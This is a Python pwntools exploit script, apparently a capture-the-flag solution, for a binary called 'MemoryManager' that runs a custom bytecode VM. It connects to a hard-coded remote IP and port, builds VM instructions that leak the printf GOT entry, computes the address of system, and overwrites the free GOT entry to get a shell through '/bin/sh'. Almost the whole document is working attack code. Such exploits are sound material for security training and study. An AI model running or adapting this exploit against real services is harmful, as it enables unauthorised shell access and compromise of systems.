from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './MemoryManager'
HOST = '39.115.110.8'
PORT = 5859

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))
r = start()
if args.D:
	# debug(r, [0x22b7, 0x206b, 0x1c16])
	# debug(r, [0x20b1, 0x1807, 0x20ce])
	# debug(r, [0x2118, 0x2005])
	debug(r, [0x1f92])

'''
command 00
---- (get_byte)
1x: from stack, x = any ( like pop )
2x: from bss, x = size of offset
	offset: get value from 0x4070e0 + offset
3x: from reg, x = size
4x: from imm, x = size

---- (move_to)
1x: to stack, x = any ( like pop )
2x: to, x = size of offset
	offset: get value from 0x4070e0 + offset
3x: to ret, x = size
----

size: 1, 2, 4, 8
'''

def set_imm64(idx, value):
	p = '\x00'
	p += '{}\x00\x48\x00'.format(chr(0x30+idx))
	p += p64(value)
	return p

def get_value(idx, offset):
	p = '\x00'
	p += '{}\x00\x28\x00'.format(chr(0x30+idx))
	p += p64(offset & 0xffffffffffffffff)
	p += '\x08'
	return p

def set_sub(dst, src0, src1):
	p = '\x05'
	p += '{}\x00{}\x00{}\x00'.format(chr(0x30+dst),chr(0x30+src0),chr(0x30+src1))
	# p += p64(offset & 0xffffffffffffffff)
	return p

def xor_mov(idx, offset):
	p = '\x03'
	p += '\x28\x00{}\x00'.format(chr(0x30+idx))
	p += p64(offset & 0xffffffffffffffff)
	p += '\x08'
	return p
def ret():
	return '\x09\x00'

r.sendafter('> ', '/bin/sh\x00')

bss_base = 0x4060e0

payload = ''
payload += set_imm64(1, 0xfa00) # printf - 0xfa00 = system
payload += get_value(0, elf.got.printf-bss_base)
payload += set_sub(2, 0, 1)
payload += xor_mov(2, elf.got.free- bss_base)

payload += ret()
r.sendafter('> ', payload)

r.interactive()
r.close()
